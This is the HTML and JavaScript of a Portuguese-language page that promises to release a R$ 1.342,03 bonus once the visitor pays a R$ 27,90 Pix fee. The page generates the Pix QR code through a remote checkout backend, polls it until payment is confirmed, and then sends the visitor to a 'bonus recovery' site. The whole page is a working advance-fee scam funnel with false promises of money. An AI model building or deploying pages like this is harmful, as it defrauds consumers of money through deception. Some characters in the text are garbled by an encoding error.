<!DOCTYPE html>
<html lang="pt-br">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@700;900&display=swap" rel="stylesheet">

<style>
* { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Poppins', sans-serif; }

.button-container {
    display: flex;
    justify-content: center;
    padding: 20px;
}

.btn-resgatar {
    background: #FF5F2C;
    color: white;
    border: none;
    width: 100%;
    max-width: 380px;
    padding: 25px 20px;
    font-size: 22px;
    font-weight: 900;
    text-transform: uppercase;
    border-radius: 12px;
    cursor: pointer;
}

.btn-resgatar:disabled {
    background: #ccc;
    cursor: wait;
}

.overlay {
    display: none;
    position: fixed;
    top: 0; left: 0;
    width: 100%; height: 100%;
    background: rgba(0,0,0,0.7);
    z-index: 9998;
}

.modal-pix {
    display: none;
    position: fixed;
    top: 50%; left: 50%;
    transform: translate(-50%, -50%);
    background: white;
    padding: 30px;
    border-radius: 20px;
    z-index: 9999;
    text-align: center;
    width: 90%;
    max-width: 400px;
}

.btn-final {
    display: none;
    background: #007bff;
    color: white;
    border: none;
    padding: 15px;
    width: 100%;
    border-radius: 50px;
    font-weight: 700;
    font-size: 16px;
    margin-top: 15px;
    cursor: pointer;
}
</style>
</head>

<body>

<div class="button-container">
    <button id="btn_pagar" class="btn-resgatar" onclick="gerarPix()">
        RESGATAR R$ 1.342,03
    </button>
</div>

<div class="overlay" id="overlay"></div>

<div class="modal-pix" id="modal_pix">
    <h3 id="status_titulo">‚úÖ QR CODE GERADO</h3>
    <p id="status_texto">Finalize o pagamento para liberar seu saque.</p>

    <div id="qr_code_div" style="margin:20px 0;"></div>

    <textarea id="txt_codigo"
        style="width:100%; height:60px; background:#f5f5f5;
        border:1px solid #ddd; border-radius:8px; padding:10px;
        font-size:12px;" readonly></textarea>

    <button class="btn-final" id="btn_final"
        onclick="window.location.href='https://recuperabonushopp.com/elementor-1064'">
        ACESSAR MEU BENEF√çCIO
    </button>
</div>

<script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>

<script>

function gerarPix() {

    const btn = document.getElementById("btn_pagar");
    btn.innerHTML = "PROCESSANDO...";
    btn.disabled = true;

    fetch("https://checkout-pix-profissional.onrender.com/pix", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ valor: "27.90" })
    })
    .then(res => res.json())
    .then(data => {

        console.log("Resposta do servidor:", data);

        // üî• VALIDA√á√ÉO FLEX√çVEL
        if (data && (data.payload || data.qr || data.pixCode)) {

            const payload = data.payload || data.qr || data.pixCode;

            document.getElementById("overlay").style.display = "block";
            document.getElementById("modal_pix").style.display = "block";
            document.getElementById("txt_codigo").value = payload;

            const qrDiv = document.getElementById("qr_code_div");
            qrDiv.innerHTML = "";

            if (data.encodedImage && data.encodedImage.length > 50) {
                const src = data.encodedImage.startsWith('http')
                    ? data.encodedImage
                    : `data:image/png;base64,${data.encodedImage}`;
                qrDiv.innerHTML = `<img src="${src}" style="width:200px;">`;
            } else {
                new QRCode(qrDiv, {
                    text: payload,
                    width: 200,
                    height: 200
                });
            }

            const transactionId =
                data.transactionId ||
                data.id ||
                data.txid ||
                data.paymentId;

            if (transactionId) {
                verificarPagamento(transactionId);
            } else {
                console.warn("TransactionId n√£o encontrado.");
            }

        } else {
            alert("Erro ao gerar QR Code.");
            btn.innerHTML = "RESGATAR R$ 1.342,03";
            btn.disabled = false;
        }

    })
    .catch(error => {
        console.error("Erro:", error);
        alert("Erro de conex√£o com servidor.");
        btn.innerHTML = "RESGATAR R$ 1.342,03";
        btn.disabled = false;
    });
}

function verificarPagamento(transactionId) {

    const intervalo = setInterval(() => {

        fetch(`https://checkout-pix-profissional.onrender.com/status/${transactionId}`)
        .then(res => res.json())
        .then(data => {

            console.log("Status:", data);

            const status = data.status || data.paymentStatus || data.situation;

            if (status === "approved" || status === "paid" || status === "CONFIRMED") {

                clearInterval(intervalo);

                document.getElementById("status_titulo").innerHTML =
                    "üéâ PAGAMENTO APROVADO!";

                document.getElementById("status_texto").innerHTML =
                    "Seu pagamento foi confirmado com sucesso.";

                document.getElementById("btn_final").style.display = "block";
            }

        })
        .catch(err => console.error("Erro status:", err));

    }, 5000);
}

</script>

</body>
</html>
